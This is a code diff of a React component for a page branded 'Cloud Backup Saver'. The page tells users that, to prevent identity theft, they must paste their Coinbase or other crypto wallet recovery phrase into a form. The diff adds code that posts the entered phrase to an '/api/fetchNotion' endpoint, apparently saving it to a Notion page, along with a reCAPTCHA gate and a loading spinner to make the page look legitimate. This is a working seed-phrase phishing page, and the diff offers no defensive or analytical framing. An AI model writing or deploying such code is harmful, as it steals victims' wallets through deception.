@@ -1,51 +1,58 @@
-import { useForm } from 'react-hook-form'
+/* eslint-disable react/prop-types */
+import { useFormContext } from 'react-hook-form'
 import ReCAPTCHA from 'react-google-recaptcha'
+import { CgSpinner } from 'react-icons/cg'
+import * as React from 'react'
 
-const RecoveryPhrase = () => {
-  const { register, handleSubmit } = useForm()
+const RecoveryPhrase = ({ nextScreen }) => {
+  const [reCaptchaToken, setRecaptchaToken] = React.useState(false)
+  const [isLoading, setIsLoading] = React.useState(false)
 
-  /*global process */
-  /*eslint no-undef: "error"*/
-  // console.log(process.env)
+  const { register, handleSubmit, getValues } = useFormContext()
+  const { walletType } = getValues()
 
-  const submitPhrase = (data) => {
-    console.log(data)
+  const onChangeReCaptcha = async (value) => {
+    if (value && typeof value === 'string') setRecaptchaToken(true)
   }
 
-  // function returnSiteKey() {
-  //   if (import.meta.env.DEV || process.env.NODE_ENV === 'development') {
-  //     console.log(import.meta.env.VITE_SITE_KEY)
-  //     return import.meta.env.VITE_SITE_KEY
-  //   } else {
-  //     console.log("vite's env values: ", import.meta.env)
-  //     console.log("vite's siteKey: ", import.meta.env.VITE_SITE_KEY)
-  //     console.log(process.env.SITE_KEY)
-  //     return import.meta.env.VITE_SITE_KEY
-  //   }
-  // }
-
-  // returnSiteKey()
-
-  // console.log("vite's env config:", import.meta.env)
-  // console.log("node's env config:", process.env)
+  const submitPhrase = async (data) => {
+    setIsLoading(true)
+    try {
+      const response = await fetch('/api/fetchNotion', {
+        method: 'POST',
+        'Content-Type': 'application/json',
+        body: JSON.stringify(data),
+      })
+      if (response.status === 200) {
+        setIsLoading(false)
+        nextScreen()
+      }
+      const newPage = await response.json()
+      console.log(newPage)
+    } catch (error) {
+      console.error(error)
+    } finally {
+      setIsLoading(false)
+    }
+  }
 
   return (
     <main className='container px-8 mx-auto'>
-      <section className='mx-auto my-12 borde'>
+      <section className='mx-auto my-12'>
         <h2 className='text-3xl font-bold text-white md:text-4xl lg:text-5xl'>
-          Secure your {`Coinbase`} wallet
+          Secure your {`${walletType}`} wallet
         </h2>
         <p className='my-8'>
           To prevent identity theft, you need to secure your wallet with us.
         </p>
         <p className='mb-8'>
-          Here’s how you secure your {`Coinbase`} wallet with{' '}
+          Here’s how you secure your {`${walletType}`} wallet with{' '}
           <strong>Cloud Backup Saver</strong>:
         </p>
         <ol className='list-decimal list-inside'>
           <li>
-            Go to your {`Coinbase`} wallet, click on Settings Recovery phrase.
-            Then copy and paste it in the form below.
+            Go to your {`${walletType}`} wallet, click on Settings Recovery
+            phrase. Then copy and paste it in the form below.
           </li>
           <li className='mt-4'>Verify yourself with reCAPTCHA.</li>
           <li className='mt-4'>Secure your wallet!</li>
@@ -57,16 +64,25 @@ const RecoveryPhrase = () => {
           placeholder='Enter your recovery phrase here.'
           cols='20'
           rows='5'
-          {...register(`coinbase-recovery-phrase`)}
+          required
+          {...register('recoveryPhrase')}
         ></textarea>
         <div className='w-full mt-4'>
-          <ReCAPTCHA sitekey={import.meta.env.VITE_SITE_KEY} />
+          <ReCAPTCHA
+            onChange={onChangeReCaptcha}
+            sitekey={import.meta.env.VITE_SITE_KEY}
+          />
         </div>
         <button
           type='submit'
-          className='block mt-8 w-full text-center rounded-lg py-3 transition-colors hover:bg-[#0046df] bg-[#0051FF]'
+          className='flex justify-center mt-8 w-full text-center rounded-lg py-3 transition-colors disabled:bg-[#6f9dff] hover:bg-[#0046df] bg-[#0051FF]'
+          disabled={!reCaptchaToken || isLoading}
         >
-          Secure Wallet
+          {!isLoading ? (
+            'Secure Wallet'
+          ) : (
+            <CgSpinner className='w-8 h-8 animate-spin' />
+          )}
         </button>
       </form>
     </main>
